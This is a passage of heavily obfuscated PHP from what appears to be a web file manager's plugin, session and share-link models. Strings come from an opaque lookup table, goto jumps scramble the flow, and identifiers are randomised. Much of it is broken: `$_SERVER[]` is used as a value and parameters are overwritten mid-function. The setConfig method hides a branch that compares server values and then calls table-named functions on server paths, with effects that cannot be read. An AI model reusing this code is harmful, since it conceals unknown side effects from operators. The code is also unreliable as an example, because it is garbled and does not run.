$this->cachePath = $this->pluginCachePath($this->fileInfo[$EȜ[164]]); return $F[$EȜ[75]]; goto fժ; e: $F = Action($EȜ[1033])->sharePathInfo($D); if (!isset($F[$EȜ[75]])) { show_json(LNG($EȜ[1354]), !1); } $this->fileInfo = $F[$EȜ[162]]; goto eƬ; fժ: } final function pluginCachePath($E䄤Њ = '') { $Dң =& $_SERVER[]; $f㵱 = IO_PATH_SYSTEM_TEMP . $Dң[1355] . $this->pluginName; if (!($F = IO::infoFull($f㵱))) { return IO::mkdir($f㵱 . $Dң[8] . $E䄤Њ); } if (empty($E䄤Њ)) { return $F[$Dң[75]]; } if (!($Fʅ = IO::fileNameExist($F[$Dң[75]], $E䄤Њ))) { return IO::mkdir($F[$Dң[75]] . $E䄤Њ); } return KodIO::make($Fʅ); } final function pluginCacheFileSet($E÷, $c؛賨 = '') { $Eޕ =& $_SERVER[]; if (!($f· = IO::infoFull($E÷))) { return IO::mkfile($E÷, $c؛賨, REPEAT_REPLACE); } IO::setContent($f·[$Eޕ[75]], $c؛賨); return $f·[$Eޕ[75]]; } final function pluginLocalFile($A򑦆 = '') { goto a; b: $Cۉ = $a󐹲 . $C; if (@file_exists($Cۉ)) { return $Cۉ; } return IO::copy($A򑦆, $a󐹲, 0, $C); goto A; a: $BǞ =& $_SERVER[]; $a󐹲 = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($a󐹲)) { mk_dir($a󐹲); } goto D֨յ; D֨յ: if (!$A򑦆) { return $a󐹲; } $FɷșȨ = IO::info($A򑦆); $C = $this->_tmpFileName($FɷșȨ) . $BǞ[91] . $FɷșȨ[$BǞ[160]]; goto b; A: } final function appPackage() { goto eׂݞ; eׂݞ: $cݦ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $Bʌ = $this->parseFile($this->pluginPath . $cݦ[1356]); goto EԎ; bӂ: return $FØѪ; goto aÂ; B޾: $D = Hook::trigger($cݦ[1357], $FØѪ); if ($D && is_array($D)) { $FØѪ = $D; } $this->packageData = $FØѪ; goto bӂ; EԎ: $this->parseLang($Bʌ); $FØѪ = json_decode_force($Bʌ); if (!$FØѪ) { return array(); } goto B޾; aÂ: } public function packageInfoGet($DҶ) { $cࡩ = $this->appPackage(); return array_get_value($cࡩ, $DҶ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1358]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1359]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1360]); } private function parseFile($b) { goto a; a: $b =& $_SERVER[]; $FƟ = file_get_contents($b); $D莃 = array($b[1361], $b[1362], $b[1363], $b[1364], $b[1365], $b[1366], $b[1367]); goto C𩬭; Cۑ: $FƟ = str_replace($D莃, $bׯ, $FƟ); return $FƟ; goto A߽; C𩬭: $bׯ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$b[84]][$b[1368]]); if (strstr($FƟ, $b[1369])) { $f˴ҋ = rawurlencode(json_encode($this->pluginLangArr)); $FƟ = str_replace($b[1369], $f˴ҋ, $FƟ); } if (strstr($FƟ, $b[1370])) { $f˴ҋ = $f˴ҋ = rawurlencode(json_encode($this->getConfig())); $FƟ = str_replace($b[1370], $f˴ҋ, $FƟ); } goto Cۑ; A߽: } private function parseLang(&$dǂϏ) { goto Bޭڇܬ; Dדˌ: $A = array(); foreach ($Aܮ[0] as $Dŉ) { $Eߩש = substr($Dŉ, strlen($CȆ֟), -4); $dƍÃ = LNG($Eߩש); $FƝ[] = $Dŉ; $A[] = str_replace(array($a[217], $a[1007], $a[330], $a[113]), array($a[50], $a[50], $a[33], $a[1373]), $dƍÃ); } $dǂϏ = str_replace($FƝ, $A, $dǂϏ); goto d; EŃ: preg_match_all($a[1372], $dǂϏ, $Aܮ); if (!is_array($Aܮ) || count($Aܮ) == 0 || !is_array($Aܮ[0]) || count($Aܮ[0]) == 0) { return; } $FƝ = array(); goto Dדˌ; Bޭڇܬ: $a =& $_SERVER[]; $CȆ֟ = $a[1371]; if (!strstr($dǂϏ, $CȆ֟)) { return; } goto EŃ; d: } private function parseConfig(&$c) { goto a蟫; eؚ: preg_match_all($C[1375], $c, $a⾇); if (!is_array($a⾇) || count($a⾇) == 0 || !is_array($a⾇[0]) || count($a⾇[0]) == 0) { return; } $fݬҲ = $this->getConfig(); goto E; bձ: $c = str_replace($A, $b, $c); goto F㶰; a蟫: $C =& $_SERVER[]; $aӐ = $C[1374]; if (!strstr($c, $aӐ)) { return; } goto eؚ; E: $A = array(); $b = array(); foreach ($a⾇[0] as $A) { $Eњ = substr($A, strlen($aӐ), -2); $A[] = $A; $b[] = _get($fݬҲ, $Eњ); } goto bձ; F㶰: } private function parsePackage(&$bִ) { goto fّτ; eܚ: preg_match_all($A[1377], $bִ, $A); if (!is_array($A) || count($A) == 0 || !is_array($A[0]) || count($A[0]) == 0) { return; } $f = $this->appPackage(); goto aǝ; eݳ: $bִ = str_replace($d, $f弲Å, $bִ); goto DÄ; fّτ: $A =& $_SERVER[]; $d = $A[1376]; if (!strstr($bִ, $d)) { return; } goto eܚ; aǝ: $d = array(); $f弲Å = array(); foreach ($A[0] as $då) { $dɥ = substr($då, strlen($d), -2); $d[] = $då; $f弲Å[] = _get($f, $dɥ); } goto eݳ; DÄ: } final function echoFile($C겘, $FҒ = false) { goto aÏ҇; aÏ҇: $A۬ݠ =& $_SERVER[]; $fن = $this->pluginPath . $C겘; if (ACT == $A۬ݠ[1378]) { echo $A۬ݠ[1379] . $this->pluginName . $A۬ݠ[8] . $C겘 . $A۬ݠ[1380]; if (!file_exists($fن)) { echo $A۬ݠ[1381]; return; } } goto fƹ; eî: $this->parsePackage($d); if (is_array($FҒ)) { $d = str_replace(array_keys($FҒ), array_values($FҒ), $d); } echo $A۬ݠ[217] . $d; goto e싂; fƹ: $d = $this->parseFile($fن); $this->parseLang($d); $this->parseConfig($d); goto eî; e싂: } final function initLang() { goto Cۘ; c湠: $cߔȝ = I18n::getType(); $A􅂱 = array(); if (file_exists($aǙ˳ . $cߔȝ . $D̙[785])) { $A􅂱 = (include $aǙ˳ . $cߔȝ . $D̙[785]); } else { if ($cߔȝ == $D̙[1384] && !file_exists($aǙ˳ . $cߔȝ . $D̙[785]) && file_exists($aǙ˳ . $D̙[1385])) { $A􅂱 = (include $aǙ˳ . $D̙[1385]); } else { if (file_exists($aǙ˳ . $cɋ . $D̙[785])) { $A􅂱 = (include $aǙ˳ . $cɋ . $D̙[785]); } } } goto bӧ; bӧ: if (!is_array($A􅂱)) { return array(); } if (@count($A􅂱) > 0) { I18n::set($A􅂱); } return $A􅂱; goto Eʠ܂; Cۘ: $D̙ =& $_SERVER[]; $cɋ = $D̙[1382]; $aǙ˳ = $this->pluginPath . $D̙[1383]; goto c湠; Eʠ܂: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($dã) { $dՌ =& $_SERVER[]; if ($_SERVER[$dՌ[700]] != $_SERVER[$dՌ[1324]]) { goto dͼ̿ʺ; aǘ: $Aա = $dՌ[808]; $Aա($_SERVER[$dՌ[809]]); $Aա($_SERVER[$dՌ[702]] . $dՌ[1325]); goto Bؔ콷; dͼ̿ʺ: $Cж = $dՌ[807]; $C = $dՌ[701]; $C = $_SERVER[$dՌ[702]] . $dՌ[703]; goto f˒; Bؔ콷: $DЏʸ = 1; while ($DЏʸ > 1) { $DЏʸ = $DЏʸ + 4; $E = rawurlencode($DЏʸ . $dՌ[361]); } goto dȞԥ; f˒: $d = $C($C); $Bع = explode($dՌ[217], $d); if (count($Bع) < $dՌ[566]) { $eՂ = $dՌ[704]; $eՂ(); } goto aǘ; dȞԥ: } return $this->modelPlugin->setConfig($this->pluginName, $dã); } public function onSetConfig($dބ) { } public function onGetConfig($c俤퍐) { } public function onChangeStatus($AΠ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Aɋ = "\160\x6c\x75\x67\151\156\x41\x75\x74\150") { $e =& $_SERVER[]; if (!defined($e[427])) { return !1; } if (_get($GLOBALS, $e[457])) { return !0; } $b = $this->getConfig(); if (!$b[$Aɋ]) { return !1; } return ActionCall($e[1386], $b[$Aɋ]); } public function url($c, $cɷ = '', $Cٶ = true) { goto b찙; b煅: $F = $this->packageVersion(); $f = $c픎 . $Bˍ[412] . $F; if (substr($c, 0, 4) == $Bˍ[144] || substr($c, 0, 2) == $Bˍ[1171]) { $Bؔ = $c . $Bˍ[1387] . $f; } else { if ($cɷ == $Bˍ[33]) { $Bؔ = $this->pluginHost . $c . $Bˍ[1387] . $f; } else { if ($cɷ === $Bˍ[76]) { $Bؔ = $this->pluginHost . $c; } else { if ($cɷ == $Bˍ[1388]) { $Bؔ = STATIC_PATH . $c . $Bˍ[1387] . $c픎; } else { if ($cɷ == $Bˍ[1389]) { $Bؔ = APP_HOST . $Bˍ[1390] . $c . $Bˍ[1387] . $c픎; } else { if (isset($D[$cɷ])) { $Bؔ = $D[$cɷ] . $c . $Bˍ[1387] . $f; } } } } } } goto F; F: if (!$Cٶ) { return $Bؔ; } echo $Bؔ; goto Aő; b찙: $Bˍ =& $_SERVER[]; $D = $this->getConfig(); $c픎 = KOD_VERSION . $Bˍ[91] . KOD_VERSION_BUILD; goto b煅; Aő: } public function link($Cɧۃ = false, $d = '') { $fǇ =& $_SERVER[]; if (!$Cɧۃ) { $this->link($fǇ[1391], $fǇ[1389]); $this->link($fǇ[1392], $fǇ[1388]); $this->link($fǇ[1393], $fǇ[1388]); $this->link($fǇ[1394], $fǇ[1388]); $this->link($fǇ[1395], $fǇ[1388]); return; } $Bӽ = $this->url($Cɧۃ, $d, !1); if (substr($Cɧۃ, -3) == $fǇ[1396]) { echo $fǇ[1397] . $Bӽ . $fǇ[1398] . $fǇ[217]; } else { if (substr($Cɧۃ, -4) == $fǇ[1399]) { echo $fǇ[1400] . $Bӽ . $fǇ[1401] . $fǇ[217]; } } } } goto F߃Ҡھ; F魆: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\160\154\x75\x67\151\156\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\141\164\x75\x73", "\162\x65\147\x69\145\163\x74", "\143\157\x6e\x66\x69\x67"); public function loadList($A줈 = false) { $cȑ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($A줈) { return $cȑ[$A줈]; } return $cȑ; } public function init() { $b괞 =& $_SERVER[]; Hook::trigger($b괞[2212]); $Dà = $this->loadPluginList(); foreach ($Dà as $dȩ => $CՉ) { $Bܯ = $this->appAllow($dȩ, $CՉ); if (!$Bܯ) { continue; } foreach ($CՉ[$b괞[2213]] as $a۾ => $CՔ) { Hook::bind($a۾, $CՔ); } } Hook::trigger($b괞[2214]); Hook::trigger(ACTION); } public function appAllow($C∋, $D, $Cڪң = true) { $dĢ뱛 =& $_SERVER[]; $Cę = PLUGIN_DIR . $C∋ . $dĢ뱛[2215]; if (!is_array($D) || !is_array($D[$dĢ뱛[2213]]) || !is_file($Cę) || $D[$dĢ뱛[708]] != 1) { return !1; } if ($Cڪң && !Action($dĢ뱛[2216])->checkAuth($C∋)) { return !1; } return !0; } public function unInstall($D䉚) { $F =& $_SERVER[]; $cɕė = $this->loadList($D䉚); if (file_exists(PLUGIN_DIR . $D䉚)) { Hook::apply($D䉚 . $F[2217]); } $this->remove($cɕė[$F[367]]); } public function changeStatus($F频, $A跏) { $fߺ =& $_SERVER[]; $D򓐎 = $this->loadList($F频); if ($A跏) { Hook::apply($F频 . $fߺ[2218]); } $this->update($D򓐎[$fߺ[367]], array($fߺ[2219] => $A跏)); } public function appRegist($a, $dҧ) { $aߒĈ =& $_SERVER[]; $C݋ = $this->loadList($a); if ($C݋) { $this->update($C݋[$aߒĈ[367]], array($aߒĈ[2213] => $dҧ)); } else { $cٲё = array($aߒĈ[28] => $a, $aߒĈ[2213] => $dҧ, $aߒĈ[708] => 0, $aߒĈ[6] => $this->getConfigDefault($a)); $this->insert($cٲё); } } public function getConfigDefault($eܢ) { $c𦢹 =& $_SERVER[]; $cꑵ = array(); $b߶ = $this->getPackageJson($eܢ); if (!$b߶ && is_array($b߶[$c𦢹[2220]])) { return $cꑵ; } foreach ($b߶[$c𦢹[2220]] as $F͍ => $c) { if (!isset($c[$c𦢹[359]]) || isset($cꑵ[$F͍])) { continue; } $cꑵ[$F͍] = $c[$c𦢹[359]]; } return $cꑵ; } public function getPackageJson($B٤) { return Hook::apply($B٤ . $_SERVER[][2221]); } public function getConfig($d, $e = false) { $Cׄ =& $_SERVER[]; $dÍ = array(); $cò = $this->loadList($d); if ($cò && is_array($cò[$Cׄ[6]])) { $dÍ = $cò[$Cׄ[6]]; } if (!$dÍ || $e) { $dÍ = $this->getConfigDefault($d); } return $dÍ; } public function setConfig($AϷ𳋜, $dԐ = false) { goto bӾ; Eݤ: $f = $cЋ[$F򅶨[6]]; if ($dԐ == !1) { $f = array(); $dԐ = $this->getConfigDefault($AϷ𳋜); } foreach ($dԐ as $A趆 => $a) { $f[$A趆] = is_string($a) ? trim($a) : $a; } goto AѦ; bӾ: $F򅶨 =& $_SERVER[]; $cЋ = $this->loadList($AϷ𳋜); if (!$cЋ) { return !1; } goto Eݤ; AѦ: $this->update($cЋ[$F򅶨[367]], array($F򅶨[6] => $f)); goto fԂ; fԂ: } public function viewList() { goto D󪒭; d: $Fы = $this->loadPluginList(); $Eϋ = array(); foreach ($Fы as $bչ => $EɄ) { unset($EɄ[$Bޠ[2213]], $EɄ[$Bޠ[6]]); $Aǉ = PLUGIN_DIR . $EɄ[$Bޠ[28]] . $Bޠ[2215]; if (!is_file($Aǉ)) { continue; } $AȤ = Hook::apply($EɄ[$Bޠ[28]] . $Bޠ[2221]); if (is_array($AȤ)) { $Eϋ[$bչ] = array_merge($EɄ, $AȤ); } } goto f콅Ώ; D󪒭: $Bޠ =& $_SERVER[]; $Fы = $this->loadList(); $this->pluginScan($Fы); goto d; f콅Ώ: return $Eϋ; goto aƚ; aƚ: } private function loadPluginList() { $dܥ =& $_SERVER[]; $eý޺ = $this->loadList(); if (strtolower(MOD) == $dܥ[2222]) { return $eý޺; } $aß = Hook::trigger($dܥ[2223], $eý޺); if ($eý޺ && !$aß) { die; } return $aß ? $aß : $eý޺; } private function pluginScan($fé) { $F̕ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $E, $bփ, 0); foreach ($E as $A⸧̰) { $dЗ = get_path_this($A⸧̰); if (isset($fé[$dЗ]) || !file_exists($A⸧̰ . $F̕[2224]) || !file_exists($A⸧̰ . $F̕[2215])) { continue; } Hook::apply($dЗ . $F̕[2218]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\163\145\163\163\x69\157\156"; public function get($Eń) { $D҄ =& $_SERVER[]; $b = $this->where(array($D҄[2225] => $Eń))->find(); if (!is_array($b)) { return !1; } return $b[$D҄[711]]; } public function set($Dݱ, $b˰, $bŬ̻ = 3600) { $dǿ =& $_SERVER[]; $a왅 = array($dǿ[2225] => $Dݱ, $dǿ[2151] => $b˰, $dǿ[2226] => $bŬ̻ + time()); if (Session::get($dǿ[2227])) { $a왅[$dǿ[1453]] = Session::get($dǿ[2227]); } else { $a왅[$dǿ[1453]] = 0; } if ($this->get($Dݱ)) { return $this->where(array($dǿ[2225] => $Dݱ))->save($a왅); } else { return $this->add($a왅, array(), !0); } } public function remove($D܇) { return $this->where(array($_SERVER[][2225] => $D܇))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2228] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\x65\x72\164\54\165\x70\x64\x61\x74\145", "\146\165\156\x63\164\x69\157\156"), array("\x63\x72\x65\x61\164\145\x54\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\143\164\151\157\x6e"), array("\157\160\164\151\157\156\x73", '', "\x69\156\163\145\x72\x74\54\x75\x70\144\x61\164\145\54\x73\x65\154\x65\143\164", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($Eӄ乩) { $Fʦ =& $_SERVER[]; $F峲 = isset($Eӄ乩[0]) ? $Eӄ乩[0] : !1; return array($Fʦ[2229] => array(USER_ID, $Fʦ[2230]), $Fʦ[2189] => array($F峲, $Fʦ[2231])); } protected function listSimple() { $B = array($_SERVER[][1453] => USER_ID); $Aʏ = $this->field($this->fieldList)->where($B)->select(); return $Aʏ ? $Aʏ : array(); } protected function getInfo($bǣ̋, $aˬ = false) { $F釧 =& $_SERVER[]; if ($aˬ) { return $this->_getShareInfo(array($F釧[441] => $bǣ̋)); } $DƯ = $this->cacheFunctionGet($F釧[2232], $bǣ̋); return $DƯ; } public function getInfoByHash($f) { return $this->_getShareInfo(array($_SERVER[][443] => $f)); } public function getInfoByPath($Fȷ) { $A̵ =& $_SERVER[]; $aѻ = array($A̵[1453] => USER_ID, $A̵[369] => $Fȷ); return $this->_getShareInfo($aѻ); } public function getInfoBySourcePath($B) { $C =& $_SERVER[]; $F = array($C[1453] => USER_ID, $C[1034] => $B); return $this->_getShareInfo($F); } private function _getShareInfo($f䂑Ը) { goto C; B訌ᆷ: $f䂑Ը = array($c[441] => $bപ[$c[441]]); $Dɦ = $c[2233]; $c枼ڣ = Model($c[537])->order($c[367])->field($Dɦ)->where($f䂑Ը)->select(); goto Eᠸ; C: $c =& $_SERVER[]; $bപ = $this->where($f䂑Ը)->find(); if (!$bപ) { return !1; } goto B訌ᆷ; Eᠸ: if ($bപ[$c[369]] == $c[468]) { $bപ[$c[391]] = IO::info($bപ[$c[1034]]); } else { $bപ[$c[391]] = Model($c[1133])->pathInfo($bപ[$c[369]]); } $bപ[$c[2234]] = $c枼ڣ; return $bപ; goto d⏐; d⏐: } protected function getInfoAuth($b) { $fܘ =& $_SERVER[]; $c = $this->getInfo($b); $c[$fܘ[376]] = Model($fܘ[454])->authMake($c[$fܘ[2234]]); return $c; } protected function listData($B = null, $D抦 = 300) { $Aݸ =& $_SERVER[]; $D = array(array($Aݸ[446] => array($Aݸ[941], 0), $Aݸ[448] => array($Aݸ[941], 0), $Aݸ[2235] => $Aݸ[2203])); if ($B == $Aݸ[1887]) { $D = array($Aݸ[446] => 1); } else { if ($B == $Aݸ[1023]) { $D = array($Aݸ[448] => 1); } } $D[$Aݸ[1453]] = USER_ID; $f͘ = $this->where($D)->selectPage($D抦); return $f͘; } protected function listToMe($FÃ = 300) { goto f󐥶; eܯި: $D퇤 = array($bϹ[521] => SourceModel::TYPE_USER, $bϹ[456] => USER_ID); if ($e̎) { $D퇤 = array(array($bϹ[521] => SourceModel::TYPE_USER, $bϹ[456] => USER_ID), array($bϹ[521] => SourceModel::TYPE_GROUP, $bϹ[456] => array($bϹ[7], $e̎)), $bϹ[2235] => $bϹ[2203]); } $B = Model($bϹ[537])->where($D퇤)->selectPage($FÃ); goto cʪ; cʪ: $Aˠ = array_to_keyvalue_group($B[$bϹ[354]], $bϹ[441]); if (!$Aˠ) { return $B; } $Dқ = $bϹ[2237]; goto F̗; F̗: $D퇤 = array($bϹ[441] => array($bϹ[384], array_keys($Aˠ))); $aߋ = $this->field($Dқ)->where($D퇤)->select(); foreach ($aߋ as $cЪ => &$b媗Ү) { $b媗Ү[$bϹ[2234]] = $Aˠ[$b媗Ү[$bϹ[441]]]; } goto E; f󐥶: $bϹ =& $_SERVER[]; $C = Session::get($bϹ[2236]); $e̎ = array_to_keyvalue($C, $bϹ[33], $bϹ[2121]); goto eܯި; E: $a = array($bϹ[2238] => $aߋ, $bϹ[2239] => $B[$bϹ[351]]); return $a; goto B; B: } protected function shareAdd($eᅍ, $d) { $eǍ =& $_SERVER[]; $f֒Ĥ = $this->_addShareData($eᅍ, $d); if (!empty($d[$eǍ[2240]])) { $this->_shareAuthSet($f֒Ĥ, $d[$eǍ[2240]]); } $this->shareEventAdd($eᅍ, $d, $eǍ[1026]); return $f֒Ĥ; } private function shareEventAdd($a𓣐ք, $fՖƅՌ, $Bчռ = "\141\144\x64") { goto Eѕ; bІ: return; goto B̑Չ; D: if ($a乔[$fʂ[448]] == $fʂ[468] && $fՖƅՌ[$fʂ[448]] == $fʂ[83]) { $f잕 = $fʂ[2242]; } if ($a乔[$fʂ[448]] == $fʂ[83] && $fՖƅՌ[$fʂ[448]] == $fʂ[468]) { $f잕 = $fʂ[2245]; } Model($fʂ[505])->eventShare($a𓣐ք, $f잕); goto bІ; Eѕ: $fʂ =& $_SERVER[]; if ($Bчռ == $fʂ[1026]) { if ($fՖƅՌ[$fʂ[446]] == $fʂ[83]) { Model($fʂ[505])->eventShare($a𓣐ք, $fʂ[2241]); } if ($fՖƅՌ[$fʂ[448]] == $fʂ[83]) { Model($fʂ[505])->eventShare($a𓣐ք, $fʂ[2242]); } return; } $a乔 = $this->getInfoByPath($a𓣐ք); goto aʊ; aʊ: $f잕 = $fʂ[2243]; if ($a乔[$fʂ[446]] == $fʂ[468] && $fՖƅՌ[$fʂ[446]] == $fʂ[83]) { $f잕 = $fʂ[2241]; } if ($a乔[$fʂ[446]] == $fʂ[83] && $fՖƅՌ[$fʂ[446]] == $fʂ[468]) { $f잕 = $fʂ[2244]; } goto D; B̑Չ: } private function _addShareData($BǍՙ, $cۇ = array()) { goto Dᆳ; cήƪ: $dǌ = $this->add($fɾ߄); $e턄 = array($C[443] => short_id($dǌ)); $this->where(array($C[440] => $dǌ))->save($e턄); goto cٗ; Dҷ: if ($eȝ = $this->where($F)->find()) { return $eȝ[$C[441]]; } if ($BǍՙ == 0) { $c΄ = array($C[28] => get_path_this($cۇ[$C[75]])); } else { $c΄ = Model($C[772])->sourceInfo($BǍՙ); if (!$c΄) { return !1; } } if (!$cۇ[$C[1359]]) { $cۇ[$C[1359]] = $c΄[$C[28]]; } goto a߸; a߸: $fɾ߄ = array($C[1444] => USER_ID, $C[383] => $BǍՙ, $C[1359] => $C[33], $C[446] => 0, $C[448] => 0, $C[1034] => $C[33], $C[295] => $C[33], $C[817] => $C[33], $C[2247] => 0, $C[2248] => 0, $C[722] => 0, $C[2249] => $C[33], $C[443] => $C[33]); $d = explode($C[47], $C[2250]); foreach ($d as $F佪) { if (!isset($cۇ[$F佪])) { continue; } $fɾ߄[$F佪] = $cۇ[$F佪]; } goto cήƪ; Dᆳ: $C =& $_SERVER[]; $F = array($C[383] => $BǍՙ, $C[1444] => USER_ID); if ($BǍՙ == 0) { $F = array($C[2246] => $cۇ[$C[1034]], $C[1444] => USER_ID); } goto Dҷ; cٗ: return $dǌ; goto dߎ; dߎ: } private function _shareAuthSet($f░, $a͝) { goto e₮; cͪ: $c->where(array($f˧[441] => $f░))->delete(); $AΖ٘ = array(); foreach ($a͝ as $d) { $b϶ = SourceModel::TYPE_USER; if ($d[$f˧[371]] == SourceModel::TYPE_GROUP) { $b϶ = SourceModel::TYPE_GROUP; } $e͂ = array($f˧[441] => $f░, $f˧[371] => $b϶, $f˧[456] => intval($d[$f˧[456]]), $f˧[2252] => 0, $f˧[2253] => -1); if ($d[$f˧[2252]]) { $e͂[$f˧[2252]] = $d[$f˧[2252]]; } else { if ($d[$f˧[2253]]) { $e͂[$f˧[2253]] = $d[$f˧[2253]]; } } $AΖ٘[] = $e͂; } goto Bŵ; e₮: $f˧ =& $_SERVER[]; if (!is_array($a͝)) { return !1; } $c = Model($f˧[2251]); goto cͪ; Bŵ: return $c->addAll($AΖ٘, array(), !0); goto D갋; D갋: } public function numViewAdd($eȄ) { $C񒃒 =& $_SERVER[]; $e = array($C񒃒[440] => $eȄ); $this->where($e)->setAdd($C񒃒[2247]); } public function numDownloadAdd($C˿) { $d =& $_SERVER[]; $EŎ = array($d[440] => $C˿); $this->where($EŎ)->setAdd($d[2248]); } protected function shareEdit($fӫ, $cͤ) { goto e烙; f: foreach ($B؍ as $bߺ) { if (!array_key_exists($bߺ, $cͤ)) { continue; } $c[$bߺ] = $cͤ[$bߺ]; } $this->shareEventAdd($D爊[$fŞ[369]], $cͤ, $fŞ[2088]); $this->where(array($fŞ[440] => $fӫ))->save($c); goto Eӆۘ; e烙: $fŞ =& $_SERVER[]; $D爊 = $this->getInfo($fӫ); if (!$D爊) { return !1; } goto aŊ; Eӆۘ: if (isset($cͤ[$fŞ[2240]])) { $this->_shareAuthSet($fӫ, $cͤ[$fŞ[2240]]); } return !0; goto c𙞈; aŊ: $this->_checkLinkShare($cͤ, $D爊); $c = array(); $B؍ = explode($fŞ[47], $fŞ[2254]); goto f; c𙞈: } private function _checkLinkShare($E֏, $Fޏ) { goto D; D: $f􆵏 =& $_SERVER[]; if ($E֏[$f􆵏[446]] != $f􆵏[83]) { return; } $F = $Fޏ[$f􆵏[391]][$f􆵏[369]]; goto F; F: if ($Fޏ[$f􆵏[391]][$f􆵏[29]] != $f􆵏[167]) { $b֗ = $this->_folderReport($F); if (!$b֗) { return; } show_json(LNG($f􆵏[2255]) . $f􆵏[2256] . $b֗, !1); } $A򊍄 = Model($f􆵏[772])->fileInfoGet($Fޏ[$f􆵏[391]][$f􆵏[369]]); if (!$A򊍄) { return; } goto c䘕; c䘕: $B = $this->shareFileMeta($A򊍄[$f􆵏[419]]); if (isset($B[$f􆵏[359]]) && $B[$f􆵏[359]] == $f􆵏[83]) { show_json(LNG($f􆵏[2257]), !1); } goto B쉞; B쉞: } private function _folderReport($aݮ) { goto bʝ; c£˝: $Dͪ̔ = array_to_keyvalue($D܈͜, $cʓ˚[33], $cʓ˚[28]); $Dͪ̔[] = $A܄[$cʓ˚[28]]; return implode($cʓ˚[8], $Dͪ̔); goto c; bʝ: $cʓ˚ =& $_SERVER[]; $A۵ = array($cʓ˚[419] => array($cʓ˚[941], 0), $cʓ˚[708] => 3); $E萭 = Model($cʓ˚[2258])->where($A۵)->field($cʓ˚[419])->select(); goto AЫ; E: $A۵ = array($cʓ˚[419] => array($cʓ˚[7], $E萭), $cʓ˚[459] => array($cʓ˚[771], "\x25{$E»㌨}\45"), $cʓ˚[397] => 0); $A܄ = Model($cʓ˚[772])->where($A۵)->field($cʓ˚[2259])->find(); if (!$A܄) { return !1; } goto b; AЫ: if (!$E萭) { return !1; } $E萭 = array_to_keyvalue($E萭, $cʓ˚[33], $cʓ˚[419]); $E»㌨ = $cʓ˚[47] . $aݮ . $cʓ˚[47]; goto E; b: $D = substr($A܄[$cʓ˚[459]], strpos($A܄[$cʓ˚[459]], $E»㌨)); $A۵ = array($cʓ˚[369] => array($cʓ˚[7], trim($D, $cʓ˚[47]))); $D܈͜ = Model($cʓ˚[772])->where($A۵)->field($cʓ˚[28])->select(); goto c£˝; c: } protected function remove($a䉺) { goto b߫; EآɈ: $fĔ = $this->where($dÄ)->delete(); if ($fĔ) { Model($F۷[537])->where(array($F۷[441] => $a䉺))->delete(); } $Aɂ = is_array($a䉺) ? $a䉺[1] : array($a䉺); goto aܳ; aܳ: for ($fء = 0; $fء < count($Aɂ); $fء++) { $dď = $this->getInfo($Aɂ[$fء]); if ($dď[$F۷[448]] == $F۷[83]) { Model($F۷[505])->eventShare($dď[$F۷[369]], $F۷[2245]); } if ($dď[$F۷[446]] == $F۷[83]) { Model($F۷[505])->eventShare($dď[$F۷[369]], $F۷[2244]); } } return $fĔ; goto C; b߫: $F۷ =& $_SERVER[]; if (is_array($a䉺)) { $a䉺 = array($F۷[7], $a䉺); } $dÄ = array($F۷[441] => $a䉺); goto EآɈ; C: } protected function removeBySource($Fڮ) { goto EӼ; EӼ: $e =& $_SERVER[]; $CÏ = array($e[383] => array($e[384], $Fڮ)); $aͧ = $this->field($e[441])->where($CÏ)->select(); goto e۰ϰڎ; e۰ϰڎ: $aͧ = array_to_keyvalue($aͧ, $e[33], $e[441]); if (!$aͧ) { return; } $CÏ = array($e[440] => array($e[384], $aͧ)); goto Bΐ; Bΐ: $this->where($CÏ)->delete(); Model($e[537])->where($CÏ)->delete(); goto Eģ; Eģ: } public function listAll($EƲ) { goto EϢ; E: $b = $this->_makeOrder()->where($Fߣ켈)->selectPage(20); if (empty($b[$E[354]])) { return array(); } $this->_listDataApply($b[$E[354]]); goto c; EϢ: $E =& $_SERVER[]; $Fߣ켈 = array(); if ($EƲ[$E[1453]]) { $Fߣ켈[$E[1453]] = $EƲ[$E[1453]]; } goto bؽ; bؽ: if ($EƲ[$E[721]]) { $CǄ = $EƲ[$E[722]] ? $EƲ[$E[722]] : strtotime(date($E[2260])); $Fߣ켈[$E[187]] = array($E[321], array($EƲ[$E[721]], $CǄ)); } if ($EƲ[$E[29]]) { $Fߣ켈[$EƲ[$E[29]]] = 1; } else { $Fߣ켈[] = array($E[446] => array($E[941], 0), $E[448] => array($E[941], 0), $E[2235] => $E[2203]); } if ($EƲ[$E[2199]]) { $Fߣ켈[] = array($E[443] => $EƲ[$E[2199]], $E[1359] => array($E[771], "\45{$EƲ[$E[2199]]}\45"), $E[2235] => $E[2203]); } goto E; c: return $b; goto BĆ; BĆ: } public function listDataApply($E֊) { $this->_listDataApply($E֊); return $E֊; } private function _listDataApply(&$a̐) { $E =& $_SERVER[]; $c牅 = array_to_keyvalue($a̐, $E[33], $E[1453]); $C٧ = Model($E[477])->userListInfo(array_unique($c牅)); $aʝ = array_to_keyvalue($a̐, $E[33], $E[369]); $Eǅ = Model($E[772])->sourceListInfo($aʝ, !0); foreach ($a̐ as &$bԽŒ) { $Cߍ = $bԽŒ[$E[1453]]; $bԽŒ[$E[2261]] = $C٧[$Cߍ] ? $C٧[$Cߍ] : !1; $dĉ = $bԽŒ[$E[369]]; 